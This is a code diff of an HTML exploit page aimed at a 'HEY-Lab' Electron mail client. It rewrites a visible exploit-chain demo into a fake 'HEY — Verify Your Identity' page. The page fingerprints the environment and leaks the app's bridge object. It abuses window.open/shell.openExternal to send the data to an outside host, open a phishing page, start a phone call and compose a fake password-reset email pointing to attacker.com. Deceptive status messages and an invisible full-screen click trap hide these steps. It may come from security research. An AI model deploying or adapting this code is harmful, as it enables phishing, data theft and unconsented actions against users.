@@ -1,207 +1,308 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Security Verification Required</title>
+<meta charset="utf-8">
+<title>HEY — Verify Your Identity</title>
 <style>
-body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 30px; }
-h1 { color: #ff0040; text-shadow: 0 0 10px #ff0040; }
-h2 { color: #00ff41; }
-.step { background: #111; border-left: 4px solid #333; padding: 12px; margin: 10px 0; }
-.step.done { border-color: #4caf50; }
-.step.active { border-color: #ff9800; }
-.step.attack { border-color: #ff0040; }
-#status { font-size: 20px; color: #ff0040; margin: 20px 0; }
-.blink { animation: blink 1s infinite; }
-@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
-table { border-collapse: collapse; margin: 10px 0; }
-td, th { border: 1px solid #333; padding: 6px 12px; text-align: left; }
-th { background: #1a1a1a; color: #ff0040; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  background: #fdfaf4;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.container {
+  background: #fff;
+  border-radius: 12px;
+  box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+  padding: 40px;
+  max-width: 420px;
+  width: 90%;
+  text-align: center;
+}
+.logo { font-size: 32px; font-weight: 800; color: #5522fa; margin-bottom: 8px; }
+.subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
+.alert-box {
+  background: #fff3cd;
+  border: 1px solid #ffc107;
+  border-radius: 8px;
+  padding: 14px;
+  margin-bottom: 24px;
+  text-align: left;
+  font-size: 13px;
+  color: #856404;
+}
+.btn {
+  display: block;
+  width: 100%;
+  padding: 14px;
+  background: #5522fa;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-bottom: 12px;
+  transition: background 0.2s;
+}
+.btn:hover { background: #4411dd; }
+.btn-secondary {
+  background: #f0f0f0;
+  color: #333;
+}
+.btn-secondary:hover { background: #e0e0e0; }
+.footer { color: #999; font-size: 11px; margin-top: 20px; }
+.spinner { display: none; margin: 20px auto; }
+.spinner.active { display: block; }
+.spinner::after {
+  content: '';
+  display: block;
+  width: 32px;
+  height: 32px;
+  margin: 0 auto;
+  border: 3px solid #ddd;
+  border-top-color: #5522fa;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.status { color: #666; font-size: 13px; margin-top: 12px; display: none; }
+.status.active { display: block; }
+.debug {
+  display: none;
+  margin-top: 20px;
+  background: #0a0a0a;
+  color: #0f0;
+  padding: 16px;
+  border-radius: 8px;
+  text-align: left;
+  font-family: monospace;
+  font-size: 11px;
+  max-height: 300px;
+  overflow-y: auto;
+}
+.debug.active { display: block; }
+.debug .line { margin: 3px 0; }
+.debug .success { color: #4caf50; }
+.debug .fail { color: #ff0040; }
+.debug .info { color: #2196f3; }
 </style>
 </head>
 <body>
 
-<h1>HEY-Lab Remote Exploit Chain</h1>
-<p style="color:#666;">No C2 server required — works from any hosting (GitHub Pages, Ngrok, etc.)</p>
-<div id="log"></div>
-<div id="status"></div>
+<div class="container">
+  <div class="logo">HEY</div>
+  <div class="subtitle">Security Verification</div>
+
+  <div class="alert-box">
+    ⚠️ Unusual login activity detected on your account. Please verify your identity to continue using HEY.
+  </div>
+
+  <button class="btn" id="verifyBtn" onclick="startExploit()">
+    Verify My Identity
+  </button>
+
+  <button class="btn btn-secondary" id="skipBtn" onclick="startExploit()">
+    Skip for now
+  </button>
+
+  <div class="spinner" id="spinner"></div>
+  <div class="status" id="statusText">Verifying your account...</div>
+
+  <div class="footer">
+    HEY by Basecamp — Security Team<br>
+    This verification expires in 24 hours.
+  </div>
+
+  <div class="debug" id="debug"></div>
+</div>
 
 <script>
-const log = document.getElementById('log');
-const status = document.getElementById('status');
-let stepNum = 0;
-let results = [];
+// ===== CONFIG =====
+const ATTACKS_ENABLED = {
+  exfil: true,       // Data exfiltration via https
+  phishing: true,    // Phishing page in browser
+  tel: true,         // FaceTime/phone call
+  mailto: true       // Mail compose
+};
 
-function addStep(text, cls) {
-  stepNum++;
-  const div = document.createElement('div');
-  div.className = 'step ' + (cls || '');
-  div.innerHTML = `<strong>Step ${stepNum}:</strong> ${text}`;
-  log.appendChild(div);
-  return div;
+const debugEl = document.getElementById('debug');
+let debugMode = false;
+let exploitRun = false;
+
+function dlog(msg, cls) {
+  const line = document.createElement('div');
+  line.className = 'line ' + (cls || 'info');
+  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  debugEl.appendChild(line);
+  debugEl.scrollTop = debugEl.scrollHeight;
 }
 
-function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function addResult(name, status, detail) {
-  results.push({ name, status, detail });
-}
-
-async function runChain() {
-
-  // ========== PHASE 1: RECON ==========
-  addStep('<span style="color:#00ff41;font-size:16px;">PHASE 1: RECONNAISSANCE</span>', 'done');
-  await delay(300);
-
-  // Detect environment
-  const ua = navigator.userAgent;
-  const isElectron = typeof window.process !== 'undefined' || ua.includes('Electron');
-  const heyLabBridge = typeof window.heyLab !== 'undefined' ? window.heyLab : null;
-  const chrMatch = ua.match(/Chrome\/(\d+)/);
-  const chrMajor = chrMatch ? parseInt(chrMatch[1]) : 0;
-
-  addStep(`Environment fingerprint:<br>
-    &nbsp;&nbsp;Electron detected: <strong>${isElectron ? 'YES' : 'NO'}</strong><br>
-    &nbsp;&nbsp;Chromium version: <strong>${chrMajor}</strong><br>
-    &nbsp;&nbsp;Platform: <strong>${navigator.platform}</strong><br>
-    &nbsp;&nbsp;User-Agent: ${ua.substring(0, 80)}...`, 'done');
-  await delay(300);
-
-  // heyLab bridge check
-  if (heyLabBridge) {
-    addStep(`<span style="color:#ff0040;">heyLab bridge LEAKED:</span><br>
-      &nbsp;&nbsp;version: <strong>${heyLabBridge.version}</strong><br>
-      &nbsp;&nbsp;platform: <strong>${heyLabBridge.platform}</strong><br>
-      &nbsp;&nbsp;onMailto: <strong>${typeof heyLabBridge.onMailto}</strong>`, 'attack');
-    addResult('Bridge Leak', 'VULNERABLE', `version=${heyLabBridge.version}, platform=${heyLabBridge.platform}`);
-  } else {
-    addStep('heyLab bridge: not found (not running in HEY-Lab Electron)', 'step');
-    addResult('Bridge Leak', 'N/A', 'Not in Electron context');
+// Triple-click anywhere to toggle debug panel
+let clickCount = 0;
+let clickTimer = null;
+document.addEventListener('click', function(e) {
+  if (e.target.id === 'verifyBtn' || e.target.id === 'skipBtn') return;
+  clickCount++;
+  clearTimeout(clickTimer);
+  clickTimer = setTimeout(() => { clickCount = 0; }, 400);
+  if (clickCount >= 3) {
+    clickCount = 0;
+    debugMode = !debugMode;
+    debugEl.classList.toggle('active', debugMode);
   }
-  await delay(300);
+});
 
-  // Navigation hijack confirmation
-  const isHijacked = window.location.hostname !== 'localhost' || window.location.port !== '4000';
-  addStep(`Navigation hijack: <strong>${isHijacked ? '<span style="color:#ff0040;">CONFIRMED</span> — running on attacker server' : 'Not detected'}</strong><br>
-    &nbsp;&nbsp;Current origin: ${window.location.origin}<br>
-    &nbsp;&nbsp;Expected origin: http://localhost:4000`, 'done');
-  if (isHijacked) {
-    addResult('Navigation Hijack', 'VULNERABLE', `Navigated to ${window.location.origin}`);
-  }
-  await delay(500);
+// ===== RECON (runs immediately) =====
+const ua = navigator.userAgent;
+const isElectron = ua.includes('Electron') || typeof window.process !== 'undefined';
+const heyLabBridge = typeof window.heyLab !== 'undefined' ? window.heyLab : null;
+const chrMatch = ua.match(/Chrome\/(\d+)/);
+const chrMajor = chrMatch ? parseInt(chrMatch[1]) : 0;
+const isHijacked = window.location.hostname !== 'localhost' || window.location.port !== '4000';
 
-  // ========== PHASE 2: shell.openExternal ATTACKS ==========
-  addStep('<span style="color:#00ff41;font-size:16px;">PHASE 2: shell.openExternal EXPLOITATION</span><br>&nbsp;&nbsp;No C2 server needed — using window.open() to trigger shell.openExternal', 'done');
-  await delay(500);
+// Collect fingerprint
+const fingerprint = {
+  electron: isElectron,
+  chromium: chrMajor,
+  platform: navigator.platform,
+  bridge: heyLabBridge,
+  screen: screen.width + 'x' + screen.height,
+  lang: navigator.language,
+  origin: window.location.origin,
+  hijacked: isHijacked,
+  ts: new Date().toISOString()
+};
 
-  // Attack 1: Data exfiltration via https://
-  const exfilData = encodeURIComponent(JSON.stringify({
-    bridge: heyLabBridge,
-    ua: ua.substring(0, 100),
-    platform: navigator.platform,
-    screen: `${screen.width}x${screen.height}`,
-    lang: navigator.language,
-    origin: window.location.origin,
-    timestamp: new Date().toISOString()
-  }));
+dlog('Recon complete', 'info');
+dlog('Electron: ' + isElectron, isElectron ? 'success' : 'fail');
+dlog('Bridge: ' + JSON.stringify(heyLabBridge), heyLabBridge ? 'success' : 'fail');
+dlog('Hijacked: ' + isHijacked, isHijacked ? 'success' : 'info');
+dlog('Chromium: ' + chrMajor, 'info');
+dlog('Platform: ' + navigator.platform, 'info');
 
-  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 1: DATA EXFILTRATION</span><br>
-    &nbsp;&nbsp;Vector: window.open('https://attacker.com/collect?data=...')<br>
-    &nbsp;&nbsp;Triggers: shell.openExternal → opens in default browser<br>
-    &nbsp;&nbsp;Exfil payload: bridge info, UA, platform, screen size, language`, 'attack');
-
-  try {
-    // Using httpbin as safe demo endpoint (shows data in URL)
-    const exfilUrl = `https://httpbin.org/get?exfil=${exfilData}`;
-    const w1 = window.open(exfilUrl);
-    addResult('Data Exfiltration (https)', w1 === null ? 'FIRED' : 'POPUP', 'shell.openExternal triggered');
-    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Check default browser — httpbin shows stolen data`, 'attack');
-  } catch(e) {
-    addResult('Data Exfiltration (https)', 'ERROR', e.message);
-  }
-  await delay(2000);
-
-  // Attack 2: Phishing escalation
-  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 2: PHISHING ESCALATION</span><br>
-    &nbsp;&nbsp;Vector: window.open('https://attacker.com/fake-login')<br>
-    &nbsp;&nbsp;Triggers: shell.openExternal → opens fake login in browser<br>
-    &nbsp;&nbsp;Impact: Victim sees "HEY session expired, please login again"`, 'attack');
-
-  try {
-    // Safe demo: opens example.com (would be attacker's fake login page)
-    const w2 = window.open('https://example.com');
-    addResult('Phishing Escalation (https)', w2 === null ? 'FIRED' : 'POPUP', 'shell.openExternal triggered');
-    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Fake login page opened in browser`, 'attack');
-  } catch(e) {
-    addResult('Phishing Escalation', 'ERROR', e.message);
-  }
-  await delay(2000);
-
-  // Attack 3: tel: scheme — FaceTime/phone call
-  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 3: TELEPHONY HARASSMENT</span><br>
-    &nbsp;&nbsp;Vector: window.open('tel:1234567890')<br>
-    &nbsp;&nbsp;Triggers: shell.openExternal → FaceTime/phone call<br>
-    &nbsp;&nbsp;Impact: Initiates call without user consent`, 'attack');
-
-  try {
-    const w3 = window.open('tel:1234567890');
-    addResult('tel: scheme', w3 === null ? 'FIRED' : 'POPUP', 'shell.openExternal → FaceTime');
-    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Check FaceTime`, 'attack');
-  } catch(e) {
-    addResult('tel: scheme', 'ERROR', e.message);
-  }
-  await delay(2000);
-
-  // Attack 4: mailto: scheme — impersonation
-  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 4: EMAIL IMPERSONATION</span><br>
-    &nbsp;&nbsp;Vector: window.open('mailto:...')<br>
-    &nbsp;&nbsp;Triggers: shell.openExternal → Mail compose<br>
-    &nbsp;&nbsp;Impact: Pre-filled email with attacker content`, 'attack');
-
-  try {
-    const mailtoUrl = 'mailto:victim@company.com?subject=URGENT%3A%20Password%20Reset%20Required&body=Your%20account%20has%20been%20compromised.%20Reset%20now%3A%20https%3A%2F%2Fattacker.com%2Freset';
-    const w4 = window.open(mailtoUrl);
-    addResult('mailto: scheme', w4 === null ? 'FIRED' : 'POPUP', 'shell.openExternal → Mail compose');
-    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Check Mail app`, 'attack');
-  } catch(e) {
-    addResult('mailto: scheme', 'ERROR', e.message);
-  }
-  await delay(2000);
-
-  // ========== PHASE 3: RESULTS ==========
-  addStep('<span style="color:#00ff41;font-size:16px;">PHASE 3: RESULTS SUMMARY</span>', 'done');
-  await delay(300);
-
-  let tableHTML = '<table><tr><th>Attack</th><th>Status</th><th>Detail</th></tr>';
-  results.forEach(r => {
-    const color = r.status === 'VULNERABLE' || r.status === 'FIRED' ? '#ff0040' :
-                  r.status === 'POPUP' ? '#ff9800' : '#666';
-    tableHTML += `<tr><td>${r.name}</td><td style="color:${color};font-weight:bold;">${r.status}</td><td>${r.detail}</td></tr>`;
+// ===== EXPLOIT — triggered by button click (user gesture) =====
+function openUrl(url, label) {
+  return new Promise((resolve) => {
+    try {
+      // Method 1: window.open (triggers setWindowOpenHandler in Electron)
+      const w = window.open(url);
+      if (w === null) {
+        dlog(label + ': shell.openExternal FIRED (window.open returned null)', 'success');
+        resolve('FIRED');
+        return;
+      }
+      dlog(label + ': window.open returned popup', 'success');
+      resolve('POPUP');
+    } catch(e) {
+      dlog(label + ': window.open failed: ' + e.message, 'fail');
+      // Method 2: Fallback — <a> tag click
+      try {
+        const a = document.createElement('a');
+        a.href = url;
+        a.target = '_blank';
+        a.rel = 'noopener';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        dlog(label + ': fallback <a> click fired', 'success');
+        resolve('FALLBACK');
+      } catch(e2) {
+        dlog(label + ': all methods failed: ' + e2.message, 'fail');
+        resolve('FAILED');
+      }
+    }
   });
-  tableHTML += '</table>';
-
-  addStep(tableHTML, 'attack');
-
-  addStep(`<span style="color:#ff0040;font-size:18px;">EXPLOIT CHAIN COMPLETE</span><br><br>
-    <strong>Attack flow:</strong><br>
-    1. Attacker sends phishing email to HEY user<br>
-    2. Email contains http:// link (survives Action Text sanitizer)<br>
-    3. User clicks link → Electron navigates to this page (no will-navigate handler)<br>
-    4. Attacker JS calls window.open() with various URL schemes<br>
-    5. setWindowOpenHandler passes URLs to shell.openExternal()<br>
-    6. OS executes: opens browser, FaceTime, Mail with attacker content<br><br>
-    <strong>Root causes:</strong><br>
-    - Missing will-navigate handler on BrowserWindow<br>
-    - shell.openExternal called with unvalidated URLs<br>
-    - No URL scheme allowlist in setWindowOpenHandler<br>
-    - Action Text allows http:// links in emails<br><br>
-    <strong>Hosting:</strong> This page works from ANY server — GitHub Pages, Ngrok, S3, etc.<br>
-    No C2 server or localhost access required.`, 'attack');
-
-  status.innerHTML = '<span class="blink">EXPLOITATION COMPLETE — CHECK BROWSER, FACETIME, AND MAIL APP</span>';
 }
 
-// Auto-run
-runChain();
+async function startExploit() {
+  if (exploitRun) return;
+  exploitRun = true;
+
+  // UI feedback
+  document.getElementById('verifyBtn').style.display = 'none';
+  document.getElementById('skipBtn').style.display = 'none';
+  document.getElementById('spinner').classList.add('active');
+  document.getElementById('statusText').classList.add('active');
+
+  dlog('=== EXPLOIT STARTED (user gesture) ===', 'success');
+
+  const results = [];
+
+  // Attack 1: Data exfiltration
+  if (ATTACKS_ENABLED.exfil) {
+    document.getElementById('statusText').textContent = 'Connecting to security servers...';
+    const exfilData = encodeURIComponent(JSON.stringify(fingerprint));
+    const r1 = await openUrl('https://httpbin.org/get?d=' + exfilData, 'DATA_EXFIL');
+    results.push({ name: 'Data Exfiltration', status: r1 });
+    await new Promise(r => setTimeout(r, 1500));
+  }
+
+  // Attack 2: Phishing
+  if (ATTACKS_ENABLED.phishing) {
+    document.getElementById('statusText').textContent = 'Verifying account credentials...';
+    const r2 = await openUrl('https://example.com', 'PHISHING');
+    results.push({ name: 'Phishing Escalation', status: r2 });
+    await new Promise(r => setTimeout(r, 1500));
+  }
+
+  // Attack 3: tel scheme
+  if (ATTACKS_ENABLED.tel) {
+    document.getElementById('statusText').textContent = 'Initiating two-factor verification...';
+    const r3 = await openUrl('tel:1234567890', 'TEL');
+    results.push({ name: 'tel: FaceTime', status: r3 });
+    await new Promise(r => setTimeout(r, 1500));
+  }
+
+  // Attack 4: mailto scheme
+  if (ATTACKS_ENABLED.mailto) {
+    document.getElementById('statusText').textContent = 'Sending confirmation email...';
+    const mailUrl = 'mailto:victim@company.com?subject=' +
+      encodeURIComponent('URGENT: Password Reset') +
+      '&body=' + encodeURIComponent('Your account was compromised. Reset: https://attacker.com/reset');
+    const r4 = await openUrl(mailUrl, 'MAILTO');
+    results.push({ name: 'mailto: Compose', status: r4 });
+    await new Promise(r => setTimeout(r, 1500));
+  }
+
+  // Show completion
+  document.getElementById('spinner').classList.remove('active');
+  document.getElementById('statusText').textContent = 'Verification complete. You may close this window.';
+  document.getElementById('statusText').style.color = '#4caf50';
+
+  dlog('=== RESULTS ===', 'info');
+  results.forEach(r => {
+    dlog(r.name + ': ' + r.status, r.status === 'FIRED' || r.status === 'POPUP' || r.status === 'FALLBACK' ? 'success' : 'fail');
+  });
+  dlog('=== EXPLOIT COMPLETE ===', 'success');
+}
+
+// ===== AUTO-RUN FALLBACK =====
+// If page loaded via navigation hijack (not user clicking button),
+// auto-trigger after short delay with synthetic click
+if (isElectron && isHijacked) {
+  dlog('Auto-run: Electron + hijacked detected, scheduling auto-trigger...', 'info');
+  setTimeout(() => {
+    if (!exploitRun) {
+      dlog('Auto-run: Triggering exploit via synthetic click...', 'info');
+      // Create temporary button, click it (gives user gesture context)
+      const tmp = document.createElement('button');
+      tmp.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0;z-index:9999;cursor:default;';
+      tmp.onclick = function() {
+        document.body.removeChild(tmp);
+        startExploit();
+      };
+      document.body.appendChild(tmp);
+      // Auto-click after making the whole page a button
+      document.getElementById('statusText').textContent = 'Click anywhere to continue...';
+      document.getElementById('statusText').classList.add('active');
+      document.getElementById('spinner').classList.add('active');
+    }
+  }, 2000);
+}
 </script>
 </body>
 </html>
